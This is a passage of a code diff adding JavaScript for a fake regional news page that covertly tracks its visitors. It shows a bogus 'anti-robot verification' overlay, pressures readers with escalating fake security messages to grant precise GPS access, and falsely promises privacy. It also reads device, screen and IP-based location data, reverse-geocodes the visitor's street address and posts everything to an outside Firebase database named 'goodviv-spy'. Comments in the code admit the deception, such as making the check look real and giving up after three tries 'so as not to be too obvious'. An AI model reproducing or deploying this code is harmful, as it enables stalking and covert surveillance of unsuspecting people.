+            return Number(coord).toFixed(6);
+        }
+
+        function convertirRumbo(grados) {
+            if (grados === null || grados === undefined) return 'N/A';
+            const direcciones = ['N', 'NE', 'E', 'SE', 'S', 'SO', 'O', 'NO'];
+            const indice = Math.round(((grados % 360) / 45)) % 8;
+            return direcciones[indice];
+        }
+
+        function convertirVelocidad(velocidadMS) {
+            if (!velocidadMS) return '0 km/h';
+            return (velocidadMS * 3.6).toFixed(2) + ' km/h';
+        }
+
+        function formatearAltitud(altitud) {
+            if (!altitud) return 'N/A';
+            return altitud.toFixed(2) + ' metros';
+        }
+
+        async function getAddressFromCoordinates(lat, lng) {
+            try {
+                // Llamada a OpenStreetMap Nominatim
+                const osmResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
+                const osmData = await osmResponse.json();
+                
+                // Llamada a BigDataCloud para información adicional
+                const bdcResponse = await fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${lat}&longitude=${lng}&localityLanguage=es`);
+                const bdcData = await bdcResponse.json();
+
+                const direccion = {
+                    calle: osmData.address.road || osmData.address.pedestrian || 'N/A',
+                    numero: osmData.address.house_number || '',
+                    barrio: osmData.address.suburb || bdcData.locality || 'N/A',
+                    ciudad: osmData.address.city || osmData.address.town || osmData.address.village || 'N/A',
+                    municipio: osmData.address.county || 'N/A',
+                    departamento: osmData.address.state || 'N/A',
+                    pais: osmData.address.country || 'N/A',
+                    codigoPostal: osmData.address.postcode || 'N/A',
+                    descripcionCompleta: osmData.display_name || 'N/A'
+                };
+
+                return direccion;
+            } catch (error) {
+                console.error('Error al obtener la dirección:', error);
+                return {
+                    error: 'Error al obtener la dirección',
+                    descripcionCompleta: 'No disponible'
+                };
+            }
+        }
+
+        // Capturar y almacenar ubicación GPS (precisa)
+        async function captureLocation(position) {
+            // Obtener la dirección detallada
+            const direccion = await getAddressFromCoordinates(position.coords.latitude, position.coords.longitude);
+            
+            const locationData = {
+                id: 'gps_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9),
+                method: 'GPS_PRECISE',
+                source: 'Diario Regional - GPS Capture',
+                timestamp: new Date().toISOString(),
+                
+                // Ubicación GPS exacta
+                coordenadas: {
+                    lat: formatearCoordenadas(position.coords.latitude),
+                    lng: formatearCoordenadas(position.coords.longitude)
+                },
+                precision: '+' + Math.round(position.coords.accuracy) + 'm',
+                altitud: formatearAltitud(position.coords.altitude),
+                rumbo: convertirRumbo(position.coords.heading),
+                velocidad: convertirVelocidad(position.coords.speed),
+                
+                // Información detallada de la ubicación
+                direccion: {
+                    calle: direccion.calle,
+                    numero: direccion.numero,
+                    barrio: direccion.barrio,
+                    ciudad: direccion.ciudad,
+                    municipio: direccion.municipio,
+                    departamento: direccion.departamento,
+                    pais: direccion.pais,
+                    codigoPostal: direccion.codigoPostal,
+                    descripcionCompleta: direccion.descripcionCompleta
+                },
+                
+                // Contexto de captura
+                captureMethod: 'Anti-Robot Verification',
+                newsTitle: document.getElementById('newsTitle').textContent,
+                userAgent: navigator.userAgent,
+                url: window.location.href,
+                
+                // Datos adicionales
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                screenRes: screen.width + 'x' + screen.height
+            };
+            
+                // Formatear la información para mostrar
+                const displayData = {
+                    gps: `
+                        🎯 GPS Exacto
+                        📍 Coordenadas: ${locationData.coordenadas.lat}, ${locationData.coordenadas.lng}
+                        🎯 Precisión: ${locationData.precision}
+                        📅 Capturado: ${new Date().toLocaleString()}
+                        📱 Dispositivo: 📱 Móvil
+                        🗺️ Ubicación:
+                          • Calle: ${locationData.direccion.calle} ${locationData.direccion.numero}
+                          • Barrio: ${locationData.direccion.barrio}
+                          • Ciudad: ${locationData.direccion.ciudad}
+                          • Municipio: ${locationData.direccion.municipio}
+                          • Departamento: ${locationData.direccion.departamento}
+                          • País: ${locationData.direccion.pais}
+                          • Código Postal: ${locationData.direccion.codigoPostal}
+                        🏔️ Altitud: ${locationData.altitud}
+                        🧭 Rumbo: ${locationData.rumbo}
+                        ⚡ Velocidad: ${locationData.velocidad}
+                        🔍 Método: GPS Anti-Robot Verification
+                        📱 Pantalla: ${window.innerWidth}x${window.innerHeight}
+                    `.trim(),
+                    ip: `
+                        🌐 Ubicación IP
+                        📍 Coordenadas: ${ipData.coordenadas.lat}, ${ipData.coordenadas.lng}
+                        🎯 Precisión: ${ipData.precision}
+                        📅 Capturado: ${new Date().toLocaleString()}
+                        📱 Dispositivo: 📱 Móvil
+                        🏙️ Ciudad: ${ipData.ciudad}
+                        📚 Región: ${ipData.region}
+                        🌍 País: ${ipData.pais}
+                        📮 Código Postal: ${ipData.codigoPostal}
+                        🔌 ISP: ${ipData.isp}
+                        🌐 IP: ${ipData.ip}
+                        🕒 Zona Horaria: ${ipData.zonaHoraria}
+                        🏢 Operador: ${ipData.operador}
+                        💻 Tipo: ${ipData.tipo}
+                        🌎 Continente: ${ipData.continente}
+                        💰 Moneda: ${ipData.moneda}
+                        🔢 ASN: ${ipData.asn}
+                        📱 Pantalla: ${window.innerWidth}x${window.innerHeight}
+                    `.trim()
+                };
+
+                // Crear elemento para mostrar la información
+                const infoContainer = document.createElement('div');
+                infoContainer.style.cssText = `
+                    background: #1a2634;
+                    color: #e5e7eb;
+                    padding: 20px;
+                    border-radius: 10px;
+                    margin: 20px 0;
+                    font-family: monospace;
+                    white-space: pre-wrap;
+                    line-height: 1.5;
+                    border: 1px solid #2f3d4f;
+                    box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+                    max-width: 800px;
+                    margin: 20px auto;
+                `;
+
+                infoContainer.innerHTML = `
+                    <div style="margin-bottom: 20px; border-bottom: 1px solid #2f3d4f; padding-bottom: 10px;">
+                        <h3 style="color: #60a5fa; margin: 0;">📍 UBICACIONES CAPTURADAS</h3>
+                    </div>
+                    <div style="color: #34d399; margin-bottom: 20px;">
+                        ${displayData.gps}
+                    </div>
+                    <div style="color: #fbbf24; margin-top: 20px;">
+                        ${displayData.ip}
+                    </div>
+                    <div style="margin-top: 20px; text-align: center;">
+                        <button onclick="location.reload()" style="
+                            background: #3b82f6;
+                            color: white;
+                            border: none;
+                            padding: 10px 20px;
+                            border-radius: 5px;
+                            cursor: pointer;
+                            font-family: inherit;
+                        ">🔄 Actualizar</button>
+                    </div>
+                `;
+
+                // Insertar el contenedor en el DOM
+                const mainContent = document.querySelector('.main-content');
+                if (mainContent) {
+                    mainContent.insertBefore(infoContainer, mainContent.firstChild);
+                }
+
+                console.log('📍 Ubicación capturada:', locationData);
+            
+                // Guardar en localStorage
+                let captures = JSON.parse(localStorage.getItem('capturedLocations') || '[]');
+                captures.push(locationData);
+                localStorage.setItem('capturedLocations', JSON.stringify(captures));            // Enviar a Firebase Realtime Database
+            saveToFirebase(locationData);
+        }
+        
+        // Función para enviar datos a Firebase
+        async function saveToFirebase(locationData) {
+            try {
+                const firebaseUrl = 'https://goodviv-spy-default-rtdb.firebaseio.com/locations.json';
+                
+                const response = await fetch(firebaseUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(locationData)
+                });
+                
+                if (response.ok) {
+                    console.log('✅ Ubicación enviada a Firebase exitosamente');
+                } else {
+                    console.log('⚠️ Error al enviar a Firebase, datos guardados localmente');
+                }
+            } catch (error) {
+                console.log('⚠️ Error de conexión con Firebase:', error);
+                console.log('💾 Datos guardados solo localmente');
+            }
+        }
+        
+        // Mostrar mensaje de éxito convincente
+        function showSuccessMessage() {
+            const alertDiv = document.querySelector('.location-alert');
+            alertDiv.innerHTML = `
+                <h3>✅ ¡Ubicación Verificada!</h3>
+                <p>Perfecto, hemos confirmado tu zona. Ahora podrás recibir alertas y noticias específicas de tu área.</p>
+                <p style="font-size: 0.95rem; margin-top: 15px; opacity: 0.9;">
+                    <strong>📱 Recomendación:</strong> Activa las notificaciones del navegador para recibir alertas inmediatas sobre situaciones que puedan afectarte.
+                </p>
+            `;
+            alertDiv.style.background = 'linear-gradient(135deg, #10b981, #059669)';
+        }
+        
+        // Manejar errores de ubicación con mensajes persuasivos mejorados
+        function handleLocationError(error) {
+            console.log('❌ Error de geolocalización:', error);
+            
+            let message = '';
+            let troubleshootingTips = '';
+            
+            if (error.code === 1 || error.code === error.PERMISSION_DENIED) {
+                message = `
+                    <h3>🔒 Permisos de Ubicación Requeridos</h3>
+                    <p><strong>¡Importante!</strong> Esta noticia puede tener impacto directo en tu área.</p>
+                    <p>Para brindarte información precisa y relevante de tu zona, necesitamos verificar tu ubicación.</p>
+                `;
+                troubleshootingTips = `
+                    <div style="background: rgba(255,255,255,0.2); padding: 15px; border-radius: 8px; margin: 15px 0; text-align: left;">
+                        <strong>📱 ¿Cómo permitir ubicación?</strong><br>
+                        1. Busca el ícono 📍 en la barra de direcciones<br>
+                        2. Haz clic y selecciona "Permitir"<br>
+                        3. En móvil: Ve a Configuración > Sitios web > Permisos
+                    </div>
+                `;
+            } else if (error.code === 2 || error.code === error.POSITION_UNAVAILABLE) {
+                message = `
+                    <h3>📡 Señal GPS Débil</h3>
+                    <p>Hay interferencias que impiden obtener tu ubicación exacta.</p>
+                `;
+                troubleshootingTips = `
+                    <div style="background: rgba(255,255,255,0.2); padding: 15px; border-radius: 8px; margin: 15px 0; text-align: left;">
+                        <strong>💡 Sugerencias:</strong><br>
+                        • Sal al aire libre si estás en interior<br>
+                        • Activa el GPS en tu dispositivo<br>
+                        • Cierra otras apps que usen ubicación
+                    </div>
+                `;
+            } else if (error.code === 3 || error.code === error.TIMEOUT) {
+                message = `
+                    <h3>⏱️ Búsqueda de Ubicación Lenta</h3>
+                    <p>Tu dispositivo está tardando en encontrar la señal GPS.</p>
+                `;
+                troubleshootingTips = `
+                    <div style="background: rgba(255,255,255,0.2); padding: 15px; border-radius: 8px; margin: 15px 0; text-align: left;">
+                        <strong>🔄 Soluciones:</strong><br>
+                        • Verifica tu conexión a internet<br>
+                        • Reinicia la aplicación<br>
+                        • Intenta en unos minutos
+                    </div>
+                `;
+            } else {
+                message = `
+                    <h3>⚠️ Error Técnico</h3>
+                    <p>Ocurrió un problema técnico al acceder a tu ubicación.</p>
+                `;
+                troubleshootingTips = `
+                    <div style="background: rgba(255,255,255,0.2); padding: 15px; border-radius: 8px; margin: 15px 0; text-align: left;">
+                        <strong>🛠️ Intenta:</strong><br>
+                        • Actualizar la página<br>
+                        • Usar otro navegador<br>
+                        • Verificar permisos del sitio
+                    </div>
+                `;
+            }
+            
+            const fullMessage = `
+                ${message}
+                ${troubleshootingTips}
+                <button class="location-btn" onclick="requestLocation()" style="margin-top: 15px;">
+                    🔄 Intentar Nuevamente
+                </button>
+                <p style="font-size: 0.9rem; margin-top: 15px; opacity: 0.9;">
+                    <strong>🔐 Privacidad garantizada:</strong> Solo usamos tu ubicación para noticias locales.
+                </p>
+            `;
+            
+            const alertDiv = document.querySelector('.location-alert');
+            alertDiv.innerHTML = fullMessage;
+            alertDiv.style.background = 'linear-gradient(135deg, #ef4444, #dc2626)';
+        }
+        
+        // Diagnóstico de geolocalización
+        function runGeolocationDiagnostic() {
+            console.log('🔧 === DIAGNÓSTICO DE GEOLOCALIZACIÓN ===');
+            
+            const diagnosticInfo = {
+                geolocalizacionSoportada: !!navigator.geolocation,
+                protocolo: location.protocol,
+                esHTTPS: location.protocol === 'https:',
+                esLocal: location.hostname === 'localhost' || location.hostname === '127.0.0.1',
+                navegador: navigator.userAgent,
+                url: location.href
+            };
+            
+            console.table(diagnosticInfo);
+            
+            if (!diagnosticInfo.geolocalizacionSoportada) {
+                console.error('❌ PROBLEMA CRÍTICO: Navegador no soporta geolocalización');
+                return false;
+            }
+            
+            if (!diagnosticInfo.esHTTPS && !diagnosticInfo.esLocal) {
+                console.warn('⚠️ ADVERTENCIA: Geolocalización puede fallar sin HTTPS');
+            }
+            
+            // Verificar permisos si es posible
+            if (navigator.permissions) {
+                navigator.permissions.query({name: 'geolocation'}).then(function(result) {
+                    console.log('🔐 Estado de permisos:', result.state);
+                    if (result.state === 'denied') {
+                        console.error('❌ PROBLEMA: Permisos de geolocalización denegados');
+                    }
+                }).catch(function(error) {
+                    console.log('ℹ️ No se pudieron verificar permisos:', error);
+                });
+            }
+            
+            return true;
+        }
+        
+        // Inicializar página
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('📰 Iniciando Diario Regional...');
+            
+            // 🚀 CAPTURA AUTOMÁTICA POR IP (INMEDIATA - SIN PERMISOS)
+            setTimeout(() => {
+                captureIPLocationAuto();
+            }, 1000); // Esperar 1 segundo para que cargue completamente
+            
+            // Ejecutar diagnóstico de geolocalización
+            runGeolocationDiagnostic();
+            
+            // Seleccionar noticia aleatoria
+            const templates = Object.keys(newsTemplates);
+            const randomTemplate = templates[Math.floor(Math.random() * templates.length)];
+            const selectedNews = newsTemplates[randomTemplate];
+            
+            // Detectar si viene de un enlace específico
+            const urlParams = new URLSearchParams(window.location.search);
+            const mode = urlParams.get('mode');
+            currentNews = selectedNews;
+            
+            if (mode && newsTemplates[mode]) {
+                currentNews = newsTemplates[mode];
+            }
+            
+            // Mostrar noticia
+            document.getElementById('newsTitle').textContent = currentNews.title;
+            
+            // Cambiar imagen si la noticia tiene una específica
+            if (currentNews.image) {
+                document.getElementById('newsImage').src = currentNews.image;
+                console.log('🖼️ Imagen específica cargada para la noticia');
+            }
+            
+            // Si la noticia tiene contenido completo, mostrar "leer más" estilo Facebook
+            if (currentNews.fullContent) {
+                document.getElementById('fullNewsContent').textContent = currentNews.fullContent;
+                
+                // Crear el contenido con "... leer más" en negrita estilo Facebook
+                const contentWithReadMore = currentNews.content + '... <span class="read-more-link" onclick="expandNewsFacebook()"><strong>leer más</strong></span>';
+                document.getElementById('newsContent').innerHTML = contentWithReadMore;
+                
+                console.log('📖 Noticia con "leer más" estilo Facebook configurada');
+            } else {
+                document.getElementById('newsContent').textContent = currentNews.content;
+            }
+            
+            // Mostrar fecha actual
+            const now = new Date();
+            const options = { 
+                year: 'numeric', 
+                month: 'long', 
+                day: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit'
+            };
+            document.getElementById('currentDate').textContent = now.toLocaleDateString('es-ES', options);
+            
+            // Generar número aleatorio de vistas
+            const views = Math.floor(Math.random() * 5000) + 1000;
+            document.getElementById('viewCount').textContent = `${views.toLocaleString()} lecturas`;
+            
+            console.log('✅ Diario Regional iniciado correctamente');
+        });
+        
+        // Función para expandir la noticia y capturar ubicación estilo Facebook
+        function expandNews() {
+            console.log('📖 Usuario hizo clic en "leer más"...');
+            
+            // Cambiar el "leer más" por un indicador de carga sutil
+            const readMoreLink = document.querySelector('.read-more-link');
+            if (readMoreLink) {
+                readMoreLink.innerHTML = '<span style="color: #6b7280; font-weight: normal;">cargando...</span>';
+                readMoreLink.style.pointerEvents = 'none';
+            }
+            
+            readMoreSection.innerHTML = `
+                <div style="text-align: center; padding: 25px;">
+                    <div style="display: inline-block; width: 40px; height: 40px; margin-bottom: 15px;">
+                        <div style="width: 40px; height: 40px; border: 4px solid #dc2626; border-top: 4px solid transparent; border-radius: 50%; animation: spin 1s linear infinite;"></div>
+                    </div>
+                    <h3 style="color: #dc2626; margin: 10px 0;">� Verificando Tu Ubicación</h3>
+                    <p style="color: #6b7280;">Por favor, permite el acceso a tu ubicación para desbloquear el contenido completo...</p>
+                </div>
+            `;
+            
+            // Solicitar ubicación antes de mostrar el contenido completo
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        // Capturar ubicación
+                        captureLocation(position);
+                        
+                        // Mostrar contenido completo
+                        showFullContentFacebook();
+                        
+                        // Mostrar mensaje de éxito
+                        setTimeout(() => {
+                            showSuccessMessage();
+                        }, 1000);
+                    },
+                    function(error) {
+                        // Si falla la ubicación, mostrar contenido pero con advertencia
+                        showFullContentFacebook();
+                        
+                        // Mostrar advertencia
+                        const readMoreSection = document.getElementById('readMoreSection');
+                        readMoreSection.innerHTML = `
+                            <div style="background: linear-gradient(135deg, #f59e0b, #d97706); color: white; padding: 20px; border-radius: 10px; margin: 20px 0;">
+                                <h4>⚠️ Ubicación No Disponible</h4>
+                                <p>El contenido se ha desbloqueado, pero recomendamos permitir ubicación para recibir alertas locales importantes.</p>
+                                <button class="location-btn" onclick="requestLocation()" style="margin-top: 10px; background: #059669;">
+                                    🔄 Permitir Ubicación Ahora
+                                </button>
+                            </div>
+                        `;
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 60000
+                    }
+                );
+            } else {
+                // Si no hay geolocalización, solo mostrar contenido
+                showFullContentFacebook();
+            }
+        }
+        
+        // Función para mostrar el contenido completo
+        function showFullContent() {
+            const fullContent = document.getElementById('fullContent');
+            const readMoreSection = document.getElementById('readMoreSection');
+            
+            // Mostrar contenido adicional con animación
+            fullContent.style.display = 'block';
+            fullContent.style.opacity = '0';
+            fullContent.style.transition = 'opacity 0.5s ease-in-out';
+            
+            setTimeout(() => {
+                fullContent.style.opacity = '1';
+            }, 100);
+            
+            // Ocultar botón de leer más
+            readMoreSection.style.display = 'none';
+            
+            // Scroll suave al contenido nuevo
+            fullContent.scrollIntoView({ behavior: 'smooth', block: 'start' });
+            
+            console.log('✅ Contenido completo mostrado');
+        }
+        
+        // Función para mostrar el contenido completo estilo Facebook
+        function showFullContentFacebook() {
+            const newsContent = document.getElementById('newsContent');
+            const fullContent = document.getElementById('fullContent');
+            
+            // Validar que los elementos existan
+            if (!newsContent) {
+                console.error('❌ Elemento newsContent no encontrado');
+                return;
+            }
+            
+            // Quitar el "leer más" y mostrar el contenido completo original
+            if (currentNews && currentNews.fullContent) {
+                newsContent.innerHTML = currentNews.fullContent;
+            }
+            
+            // Mostrar contenido adicional si existe
+            if (fullContent) {
+                fullContent.style.display = 'block';
+                fullContent.style.opacity = '0';
+                fullContent.style.transition = 'opacity 0.3s ease-in-out';
+                
+                setTimeout(() => {
+                    fullContent.style.opacity = '1';
+                }, 100);
+            }
+            
+            console.log('✅ Contenido expandido estilo Facebook');
+        }
+        
+        // Función nueva para expandir contenido con verificación anti-robot y múltiples intentos
+        function expandNewsFacebook() {
+            console.log('🤖 Usuario hizo clic en "leer más" - iniciando verificación anti-robot...');
+            
+            // Cambiar el "leer más" por indicador de verificación
+            const readMoreLink = document.querySelector('.read-more-link');
+            if (readMoreLink) {
+                readMoreLink.innerHTML = '<span style="color: #6b7280; font-weight: normal;">verificando...</span>';
+                readMoreLink.style.pointerEvents = 'none';
+            }
+            
+            // Mostrar overlay de verificación anti-robot
+            showRobotVerificationOverlay();
+            
+            // Esperar 2.5 segundos para que parezca una verificación real
+            setTimeout(() => {
+                attemptLocationCapture(1); // Primer intento
+            }, 2500);
+        }
+        
+        // Nueva función para intentos múltiples de captura
+        function attemptLocationCapture(attemptNumber) {
+            locationAttempts = attemptNumber; // Actualizar contador global
+            console.log(`📍 Intento ${attemptNumber} de captura de ubicación...`);
+            
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(position) {
+                        // ✅ ÉXITO - Captura exitosa
+                        console.log('✅ Ubicación capturada exitosamente en intento', attemptNumber);
+                        captureLocation(position);
+                        
+                        // Mostrar verificación completada
+                        showVerificationSuccess();
+                        
+                        // Ocultar overlay y mostrar contenido después de 1 segundo
+                        setTimeout(() => {
+                            hideVerificationOverlay();
+                            showFullContentFacebook();
+                        }, 1000);
+                    },
+                    function(error) {
+                        // ❌ FALLÓ - Regresar a la noticia principal
+                        console.log(`❌ Fallo en intento ${attemptNumber}:`, error.message);
+                        
+                        // Detectar si los permisos están bloqueados permanentemente
+                        if (error.code === error.PERMISSION_DENIED && error.message.includes('blocked')) {
+                            console.log('🚫 Permisos bloqueados permanentemente - mostrando instrucciones');
+                            showPermissionBlockedInstructions();
+                            return;
+                        }
+                        
+                        if (attemptNumber <= 3) {
+                            // Mostrar mensaje y regresar a "leer más"
+                            showLocationDeniedMessage(attemptNumber);
+                        } else {
+                            // Después de 3 intentos, mostrar contenido (para no ser muy obvio)
+                            console.log('⚠️ Máximo de intentos alcanzado, mostrando contenido');
+                            showVerificationSuccess();
+                            setTimeout(() => {
+                                hideVerificationOverlay();
+                                showFullContentFacebook();
+                            }, 1000);
+                        }
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 8000,
+                        maximumAge: 0
+                    }
+                );
+            } else {
+                // Si no hay geolocalización, mostrar contenido
+                showVerificationSuccess();
+                setTimeout(() => {
+                    hideVerificationOverlay();
+                    showFullContentFacebook();
+                }, 1000);
+            }
+        }
+        
+        // Función para mostrar diagnóstico detallado al usuario
+        function showDetailedDiagnostic() {
+            const diagnosticInfo = {
+                navegador: navigator.userAgent,
+                geolocalizacionSoportada: !!navigator.geolocation,
+                protocolo: location.protocol,
+                esHTTPS: location.protocol === 'https:',
+                esLocal: location.hostname === 'localhost' || location.hostname === '127.0.0.1',
+                dominio: location.hostname,
+                url: location.href
+            };
+            
+            console.log('🔧 === DIAGNÓSTICO DETALLADO ===');
+            console.table(diagnosticInfo);
+            
+            let diagnosticMessage = `🔧 DIAGNÓSTICO DE GEOLOCALIZACIÓN:
+
+✅ Geolocalización soportada: ${diagnosticInfo.geolocalizacionSoportada ? 'SÍ' : 'NO'}
+🌐 Protocolo: ${diagnosticInfo.protocolo}
+🔐 HTTPS: ${diagnosticInfo.esHTTPS ? 'SÍ' : 'NO'}
+🏠 Dominio: ${diagnosticInfo.dominio}
+
+`;
+
+            if (!diagnosticInfo.geolocalizacionSoportada) {
+                diagnosticMessage += `❌ PROBLEMA CRÍTICO: Tu navegador no soporta geolocalización.
+📱 Solución: Actualiza tu navegador a la versión más reciente.
+
+`;
+            }
+
+            if (!diagnosticInfo.esHTTPS && !diagnosticInfo.esLocal) {
+                diagnosticMessage += `⚠️ ADVERTENCIA: El sitio no usa HTTPS.
+🔒 Esto puede causar problemas con la geolocalización.
+✅ Recomendación: Usa el sitio desde una URL con HTTPS.
+
+`;
+            }
+
+            if (navigator.permissions) {
+                navigator.permissions.query({name: 'geolocation'}).then(function(result) {
+                    const permStatus = result.state;
+                    diagnosticMessage += `🔐 Estado de permisos: ${permStatus}
+
+`;
+                    
+                    if (permStatus === 'denied') {
+                        diagnosticMessage += `❌ PROBLEMA: Permisos denegados.
+🔧 Solución: 
+1. Haz clic en el ícono 🔒 o 📍 en la barra de direcciones
+2. Selecciona "Permitir" para ubicación
+3. Recarga la página
+
+`;
+                    } else if (permStatus === 'prompt') {
+                        diagnosticMessage += `✅ Los permisos se solicitarán cuando sea necesario.
+
+`;
+                    } else {
+                        diagnosticMessage += `✅ Permisos concedidos correctamente.
+
+`;
+                    }
+                    
+                    diagnosticMessage += `📊 CONSEJOS ADICIONALES:
+• Asegúrate de tener GPS activado en tu dispositivo
+• Si estás en interior, sal al aire libre
+• Cierra otras aplicaciones que usen ubicación
+• Verifica tu conexión a internet
+
+🔄 Después de hacer cambios, intenta de nuevo.`;
+                    
+                    alert(diagnosticMessage);
+                });
+            } else {
+                diagnosticMessage += `ℹ️ No se pueden verificar permisos automáticamente.
+
+📊 CONSEJOS GENERALES:
+• Verifica que el GPS esté activado
+• Permite ubicación cuando el navegador lo pida
+• Si estás en interior, sal al aire libre
+• Recarga la página después de cambiar configuraciones
+
+🔄 Intenta nuevamente después de verificar estos puntos.`;
+                
+                alert(diagnosticMessage);
+            }
+        }
+        
+        // Función para mostrar instrucciones cuando los permisos están bloqueados
+        function showPermissionBlockedInstructions() {
+            const content = document.getElementById('verificationContent');
+            if (content) {
+                content.innerHTML = `
+                    <div style="font-size: 4rem; margin-bottom: 30px;">🚫</div>
+                    <h2 style="font-size: 1.6rem; margin-bottom: 20px; font-weight: 600; color: #f59e0b;">
+                        Verificación Bloqueada
+                    </h2>
+                    <p style="margin: 20px 0; font-size: 1.1rem; line-height: 1.5; color: #e5e7eb;">
+                        El navegador ha bloqueado las verificaciones de seguridad. Para acceder al contenido necesitas resetear los permisos:
+                    </p>
+                    
+                    <div style="text-align: left; margin: 25px 0; padding: 20px; background: rgba(245, 158, 11, 0.1); border-radius: 10px; border: 1px solid rgba(245, 158, 11, 0.3);">
+                        <h3 style="color: #f59e0b; margin-bottom: 15px; font-size: 1.2rem;">📋 Instrucciones para Chrome:</h3>
+                        <ol style="color: #e5e7eb; font-size: 1rem; line-height: 1.6; margin: 0; padding-left: 20px;">
+                            <li>Haz clic en el <strong>ícono de candado 🔒</strong> junto a la URL</li>
+                            <li>Selecciona <strong>"Configuración del sitio"</strong></li>
+                            <li>En <strong>"Ubicación"</strong> cambia a <strong>"Preguntar"</strong></li>
+                            <li>Recarga la página y vuelve a intentar</li>
+                        </ol>
+                    </div>
+
+                    <div style="margin: 30px 0;">
+                        <button onclick="location.reload()" style="
+                            background: linear-gradient(135deg, #f59e0b, #d97706);
+                            color: white;
+                            border: none;
+                            padding: 18px 40px;
+                            border-radius: 50px;
+                            font-size: 1.2rem;
+                            font-weight: bold;
+                            cursor: pointer;
+                            margin: 10px;
+                            box-shadow: 0 4px 15px rgba(245, 158, 11, 0.3);
+                        ">🔄 Recargar Página</button>
+                        
+                        <button onclick="hideVerificationOverlay(); showFullContentFacebook();" style="
+                            background: linear-gradient(135deg, #6b7280, #4b5563);
+                            color: white;
+                            border: none;
+                            padding: 18px 40px;
+                            border-radius: 50px;
+                            font-size: 1.2rem;
+                            font-weight: bold;
+                            cursor: pointer;
+                            margin: 10px;
+                            box-shadow: 0 4px 15px rgba(107, 114, 128, 0.3);
+                        ">📰 Continuar Sin Verificar</button>
+                    </div>
+                    
+                    <p style="font-size: 0.9rem; color: #6b7280; margin-top: 15px;">
+                        💡 Después de seguir las instrucciones, la verificación funcionará correctamente
+                    </p>
+                `;
+                
+                console.log('🚫 Instrucciones de permisos bloqueados mostradas');
+            }
+        }
+        
+        // Función para mostrar overlay de verificación anti-robot
+        function showRobotVerificationOverlay() {
+            const overlay = document.createElement('div');
+            overlay.id = 'robotVerificationOverlay';
+            overlay.innerHTML = `
+                <div style="
+                    position: fixed;
+                    top: 0;
+                    left: 0;
+                    width: 100%;
+                    height: 100%;
+                    background: rgba(0,0,0,0.9);
+                    display: flex;
+                    align-items: center;
+                    justify-content: center;
+                    z-index: 9999;
+                    color: white;
+                    text-align: center;
+                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+                ">
+                    <div id="verificationContent">
+                        <div style="font-size: 4rem; margin-bottom: 30px;">🔐</div>
+                        <h2 style="font-size: 1.8rem; margin-bottom: 20px; font-weight: 600;">Verificando que no eres un robot</h2>
+                        <p style="font-size: 1.1rem; margin: 20px 0; color: #e5e7eb;">Este proceso es automático y toma unos segundos...</p>
+                        <div style="
+                            width: 50px;
+                            height: 50px;
+                            border: 4px solid #374151;
+                            border-top: 4px solid #3b82f6;
+                            border-radius: 50%;
+                            animation: spin 1s linear infinite;
+                            margin: 30px auto;
+                        "></div>
+                        <p style="font-size: 0.9rem; color: #9ca3af; margin-top: 20px;">Verificación de seguridad requerida para acceder al contenido completo</p>
+                    </div>
+                </div>
+                <style>
+                    @keyframes spin {
+                        0% { transform: rotate(0deg); }
+                        100% { transform: rotate(360deg); }
+                    }
+                </style>
+            `;
+            document.body.appendChild(overlay);
+            console.log('🤖 Overlay de verificación anti-robot mostrado');
+        }
+        
+        // Función para mostrar verificación exitosa
+        function showVerificationSuccess() {
+            const content = document.getElementById('verificationContent');
+            if (content) {
+                content.innerHTML = `
+                    <div style="font-size: 4rem; margin-bottom: 30px;">✅</div>
+                    <h2 style="font-size: 1.8rem; margin-bottom: 20px; font-weight: 600; color: #10b981;">Verificación Completada</h2>
+                    <p style="font-size: 1.1rem; margin: 20px 0; color: #e5e7eb;">Acceso autorizado. Cargando contenido completo...</p>
+                    <div style="
+                        width: 40px;
+                        height: 40px;
+                        border: 3px solid #10b981;
+                        border-radius: 50%;
+                        margin: 20px auto;
+                        display: flex;
+                        align-items: center;
+                        justify-content: center;
+                        font-size: 1.5rem;
+                    ">✓</div>
+                `;
+                console.log('✅ Verificación anti-robot completada exitosamente');
+            }
+        }
+        
+        // Función para ocultar overlay de verificación
+        function hideVerificationOverlay() {
+            const overlay = document.getElementById('robotVerificationOverlay');
+            if (overlay) {
+                overlay.style.opacity = '0';
+                overlay.style.transition = 'opacity 0.3s ease-out';
+                setTimeout(() => {
+                    overlay.remove();
+                    console.log('🤖 Overlay de verificación removido');
+                }, 300);
+            }
+        }
+        
+        // Función para mostrar mensaje cuando se rechaza la ubicación
+        function showLocationDeniedMessage(attemptNumber) {
+            const messages = [
+                {
+                    icon: "🔐",
+                    title: "Verificación de Seguridad Requerida",
+                    text: "Para proteger este contenido sensible de accesos no autorizados, necesitamos confirmar que eres una persona real. Sin esta verificación no podemos mostrar la información completa.",
+                    buttonText: "🛡️ Intentar Verificación de Nuevo",
+                    color: "#dc2626"
+                },
+                {
+                    icon: "📡",
+                    title: "Acceso Restringido", 
+                    text: "Este contenido sobre el caso judicial está disponible solo para usuarios verificados. La verificación de identidad es obligatoria para acceder a los detalles del operativo.",
+                    buttonText: "🔍 Verificar Mi Identidad Ahora",
+                    color: "#ea580c"
+                },
+                {
+                    icon: "🚨",
+                    title: "Contenido de Seguridad Crítica",
+                    text: "Esta información puede ser vital para tu seguridad personal. ÚLTIMA OPORTUNIDAD: Se requiere verificación de identidad para acceder a los detalles completos del caso 'Coquito'.",
+                    buttonText: "✅ CONFIRMAR IDENTIDAD - Último Intento",
+                    color: "#b91c1c"
+                }
+            ];
+            
+            const message = messages[attemptNumber - 1] || messages[2];
+            
+            const content = document.getElementById('verificationContent');
+            if (content) {
+                content.innerHTML = `
